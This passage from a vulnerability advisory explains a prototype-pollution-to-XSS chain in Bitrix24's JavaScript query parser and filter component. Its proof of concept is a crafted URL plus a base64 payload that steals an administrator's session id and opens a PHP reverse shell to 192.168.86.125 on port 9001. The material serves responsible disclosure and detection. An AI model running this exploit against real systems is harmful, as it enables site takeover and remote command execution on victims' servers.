</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">trim</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^[?#&amp;]/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">url</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">acc</span><span class="p">,</span> <span class="nx">param</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="p">[</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\+/g</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">keyFormat</span> <span class="o">=</span> <span class="nx">getKeyFormat</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">formatter</span> <span class="o">=</span> <span class="nx">getParser</span><span class="p">(</span><span class="nx">keyFormat</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">formatter</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">acc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">acc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>For certain query parameter keys, additional parsing is performed.</p>
<p>The format of these keys is determined by the <code>getKeyFormat</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 10050 to 10060
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getKeyFormat</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="sr">/^\w+\[([\w]+)\]$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;index&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="sr">/^\w+\[\]$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;bracket&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If the key is of the form <code>aaa[bbb]</code>, the format returned will be <code>index</code>. We will focus on this type of key for the rest of the report.</p>
<p>Parsing is then performed by the formatter returned by <code>getParser</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 10005 to 10048
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getParser</span><span class="p">(</span><span class="nx">format</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="nx">format</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;index&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">(</span><span class="nx">sourceKey</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">accumulator</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="sr">/\[(\w*)\]$/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">sourceKey</span><span class="p">);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">sourceKey</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\[\w*\]$/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isNil</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">accumulator</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isUndefined</span><span class="p">(</span><span class="nx">accumulator</span><span class="p">[</span><span class="nx">key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">accumulator</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">accumulator</span><span class="p">[</span><span class="nx">key</span><span class="p">][</span><span class="nx">result</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;bracket&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// parse bracket style keys
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// parse default style keys
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>getParser</code> returns a function that, when passed a <code>sourceKey</code> and the <code>value</code> corresponding to that key, parses the key and adds it to the JavaScript object <code>accumulator</code>.</p>
<p>As the attacker has control over the <code>sourceKey</code> and <code>value</code> parameters via the URL&rsquo;s query string, they have control over the <code>result</code> and <code>key</code> variables as they are derived from <code>sourceKey</code> via the regex in <code>[1]</code> and <code>[2]</code>.</p>
<p>An attacker could pollute the global JavaScript prototype by setting <code>key</code> to <code>__proto__</code>. For example, let <code>sourceKey</code> be <code>__proto__[bbb]</code> and <code>value</code> be <code>ccc</code>.
In <code>[1]</code>, <code>result</code> will be <code>['[bbb]', 'bbb']</code>, and in <code>[2]</code>, <code>key</code> will be <code>__proto__</code>.</p>
<p>Therefore, in <code>[3]</code>, <code>accumulator['__proto__']['bbb']</code> will be set to <code>ccc</code>. As the <code>__proto__</code> property of a JavaScript object refers to the <code>Object.prototype</code> shared by all JavaScript objects, the property <code>bbb</code> with the value <code>ccc</code> will now be present in all JavaScript objects.</p>
<p>On certain pages, the presence of a prototype pollution gadget in the <code>BX.Main.Filter</code> component allows an attacker to execute arbitrary JavaScript code on the victim&rsquo;s browser.</p>
<p>Upon page load and subsequent initialization of the filter component, the <code>setPreset</code> function is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/cache/js/s1/bitrix24/page_17c0769aa6008d4b7096462e823dd9d6/page_17c0769aa6008d4b7096462e823dd9d6_v1.js?1678346430206239
</span></span></span><span class="line"><span class="cl"><span class="c1">// sourcemapped to script.js, lines 2507 to 2581
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">setPreset</span><span class="p">(</span><span class="nx">presetData</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">container</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getContainer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">square</span><span class="p">,</span> <span class="nx">squares</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">squaresResult</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">BX</span><span class="p">.</span><span class="nx">type</span><span class="p">.</span><span class="nx">isPlainObject</span><span class="p">(</span><span class="nx">presetData</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">squares</span> <span class="o">=</span> <span class="nx">BX</span><span class="p">.</span><span class="nx">Filter</span><span class="p">.</span><span class="nx">Utils</span><span class="p">.</span><span class="nx">getByClass</span><span class="p">(</span><span class="nx">container</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">settings</span><span class="p">.</span><span class="nx">classSquare</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">squares</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">BX</span><span class="p">.</span><span class="nx">remove</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">presetData</span> <span class="o">=</span> <span class="nx">BX</span><span class="p">.</span><span class="nx">clone</span><span class="p">(</span><span class="nx">presetData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">presetData</span><span class="p">.</span><span class="nx">ADDITIONAL</span> <span class="o">=</span> <span class="nx">presetData</span><span class="p">.</span><span class="nx">ADDITIONAL</span> <span class="o">||</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">BX</span><span class="p">.</span><span class="nx">onCustomEvent</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="s1">&#39;BX.Filter.Search:beforeSquaresUpdate&#39;</span><span class="p">,</span> <span class="p">[</span><span class="nx">presetData</span><span class="p">,</span> <span class="k">this</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">presetData</span><span class="p">.</span><span class="nx">ID</span> <span class="o">!==</span> <span class="s1">&#39;default_filter&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">presetData</span><span class="p">.</span><span class="nx">ID</span> <span class="o">!==</span> <span class="s1">&#39;tmp_filter&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">square</span> <span class="o">=</span> <span class="nx">BX</span><span class="p">.</span><span class="nx">decl</span><span class="p">({</span> <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">block</span><span class="o">:</span> <span class="s1">&#39;main-ui-search-square&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="nx">presetData</span><span class="p">.</span><span class="nx">TITLE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="o">:</span> <span class="nx">presetData</span><span class="p">.</span><span class="nx">ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">isPreset</span><span class="o">:</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="nx">BX</span><span class="p">.</span><span class="nx">prepend</span><span class="p">(</span><span class="nx">square</span><span class="p">,</span> <span class="nx">container</span><span class="p">);</span> <span class="c1">// [5]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In <code>[4]</code> a HTML element is constructed via the <code>BX.decl</code> function, and in <code>[5]</code> the resultant <code>square</code> element is inserted into the DOM via the <code>BX.prepend</code> function.</p>
<p><code>BX.decl</code> is a simple wrapper over the <code>BX.render</code> function, shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core_decl.js lines 21 to 95
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">BX</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">element</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isBlock</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="o">||</span> <span class="nx">isTag</span><span class="p">(</span><span class="nx">item</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">tag</span> <span class="o">=</span> <span class="s1">&#39;tag&#39;</span> <span class="k">in</span> <span class="nx">item</span> <span class="o">?</span> <span class="nx">item</span><span class="p">.</span><span class="nx">tag</span> <span class="o">:</span> <span class="s1">&#39;div&#39;</span><span class="p">;</span> <span class="c1">// [6]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">className</span> <span class="o">=</span> <span class="nx">item</span><span class="p">.</span><span class="nx">block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">attrs</span> <span class="o">=</span> <span class="s1">&#39;attrs&#39;</span> <span class="k">in</span> <span class="nx">item</span> <span class="o">?</span> <span class="nx">item</span><span class="p">.</span><span class="nx">attrs</span> <span class="o">:</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">events</span> <span class="o">=</span> <span class="s1">&#39;events&#39;</span> <span class="k">in</span> <span class="nx">item</span> <span class="o">?</span> <span class="nx">item</span><span class="p">.</span><span class="nx">events</span> <span class="o">:</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">props</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Load props, atts and events
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nx">element</span> <span class="o">=</span> <span class="nx">BX</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">tag</span><span class="p">,</span> <span class="p">{</span><span class="nx">props</span><span class="o">:</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">attrs</span><span class="o">:</span> <span class="nx">attrs</span><span class="p">,</span> <span class="nx">events</span><span class="o">:</span> <span class="nx">events</span><span class="p">,</span> <span class="nx">children</span><span class="o">:</span> <span class="nx">children</span><span class="p">,</span> <span class="nx">html</span><span class="o">:</span> <span class="nx">text</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">element</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>As the <code>tag</code> property is not present on the object passed to <code>BX.decl</code> and eventually <code>BX.render</code>, the JavaScript engine checks if the property exists on the global object prototype. An attacker could use the prototype pollution vulnerability discussed earlier to set the <code>tag</code> property to <code>script</code>. The <code>tag</code> property is accessed in <code>[6]</code> and passed to the <code>BX.create</code> function (shown below):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 8931 to 8941
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nx">create</span><span class="p">(</span><span class="nx">tag</span><span class="p">,</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">context</span> <span class="o">=</span> <span class="nb">document</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">tagName</span> <span class="o">=</span> <span class="nx">tag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">options</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isObjectLike</span><span class="p">(</span><span class="nx">tag</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">options</span> <span class="o">=</span> <span class="nx">tag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">tagName</span> <span class="o">=</span> <span class="nx">tag</span><span class="p">.</span><span class="nx">tag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">Dom</span><span class="p">.</span><span class="nx">adjust</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">tagName</span><span class="p">),</span> <span class="nx">options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>BX.create</code> function creates a HTML element according to the <code>tag</code> parameter using <code>document.createElement</code> and passes the element to <code>Dom.adjust</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// bitrix/js/main/core/core.js lines 8841 to 8920
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nx">adjust</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{})</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">target</span><span class="p">.</span><span class="nx">nodeType</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">element</span> <span class="o">=</span> <span class="nx">target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">target</span><span class="p">.</span><span class="nx">nodeType</span> <span class="o">===</span> <span class="nx">Node</span><span class="p">.</span><span class="nx">DOCUMENT_NODE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">element</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isPlainObject</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">    <span class="c1">// Initialize element attrs, event handlers, styles
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;text&#39;</span> <span class="k">in</span> <span class="nx">data</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isNil</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">;</span> <span class="c1">// [7]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span> <span class="nx">element</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;html&#39;</span> <span class="k">in</span> <span class="nx">data</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">Type</span><span class="p">.</span><span class="nx">isNil</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">html</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">element</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As the <code>text</code> property of the <code>data</code> object is not present, an attacker could control this value via prototype pollution.</p>
<p>Therefore, by controlling the HTML element type by polluting the <code>tag</code> property to <code>script</code> and polluting the <code>text</code> property with attacker controlled JavaScript, an attacker could execute arbitrary JavaScript on the user&rsquo;s browser.</p>
<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>The PoC provided below targets the <code>https://TARGET_HOST/workgroups/</code> page. However, any page that includes both the left vertical menu component and the <code>BX.Main.Filter</code> component will be vulnerable.</p>
<p>Any user accessing the following URL will result in the anchor portion of the URL being base64 decoded and executed as JavaScript:</p>
<pre tabindex="0"><code>https://TARGET_HOST/workgroups/?__proto__[tag]=script&amp;__proto__[text]=eval(atob(location.hash.substring(1)))
</code></pre><p>For example, if the anchor is</p>
<pre tabindex="0"><code>ZmV0Y2goIi9iaXRyaXgvYWRtaW4vcGhwX2NvbW1hbmRfbGluZS5waHA/bGFuZz1lbiYiK2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MLm1hdGNoKC9zZXNzaWQ9W2EtZjAtOV17MzJ9LylbMF0sewogICAgbWV0aG9kOiJQT1NUIiwKICAgIGhlYWRlcnM6ewogICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcKICAgIH0sICAgIAogICAgYm9keTogbmV3IFVSTFNlYXJjaFBhcmFtcyh7CiAgICAgICAgcXVlcnk6IGAkc29jaz1mc29ja29wZW4oIjE5Mi4xNjguODYuMTI1Iiw5MDAxKTskcHJvYz1wcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwkcGlwZXMpO2AsCiAgICAgICAgYWpheDogInkiLAogICAgICAgIHJlc3VsdF9hc190ZXh0OiJOIgogICAgfSkKfSk=
</code></pre><p>which is a base64 encoded version of</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;/bitrix/admin/php_command_line.php?lang=en&amp;&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/sessid=[a-f0-9]{32}/</span><span class="p">)[</span><span class="mi">0</span><span class="p">],{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>    
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">query</span><span class="o">:</span> <span class="sb">`$sock=fsockopen(&#34;192.168.86.125&#34;,9001);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ajax</span><span class="o">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result_as_text</span><span class="o">:</span><span class="s2">&#34;N&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>and the user is an administrator, a reverse shell connection will be opened to <code>192.168.86.125</code> on port 9001.</p>
<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>An attacker does not require any permissions to carry out this attack. However, the victim needs to visit a specially crafted URL supplied by the attacker.</p>
<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the string <code>__proto__</code> in the query parameters of requests.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#771e19111837151e03051e0f5914181a"><span class="__cf_email__" data-cfemail="2f464149406f4d465b5d4657014c4042">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#e38a8d858ca3d280ce818a97918a9bcd9196"><span class="__cf_email__" data-cfemail="c5acaba3aa85f4a6e8a7acb1b7acbdebb7b0">[email&#160;protected]</span></a></li>
